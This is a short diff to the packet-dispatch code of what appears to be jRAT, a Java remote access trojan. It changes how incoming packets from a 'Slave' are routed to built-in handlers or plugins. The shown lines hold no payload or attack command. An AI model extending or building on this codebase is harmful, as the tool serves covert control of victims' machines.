@@ -4,6 +4,7 @@ import java.util.HashMap;
 import java.util.Set;
 
 import pro.jrat.Slave;
+import pro.jrat.common.PacketRange;
 import pro.jrat.extensions.PluginEventHandler;
 
 
@@ -147,12 +148,10 @@ public class IncomingPackets {
 				}
 			}
 			
-			PluginEventHandler.onPacket(slave, header); 
-			
-			if (ac != null) {
+			if (header <= PacketRange.incomingRange) {
 				ac.read(slave, slave.getDataInputStream());
 			} else {
-				throw new NullPointerException("Could not find jRAT packet: " + header);
+				PluginEventHandler.onPacket(slave, header); 
 			}
 
 			return ac != null;
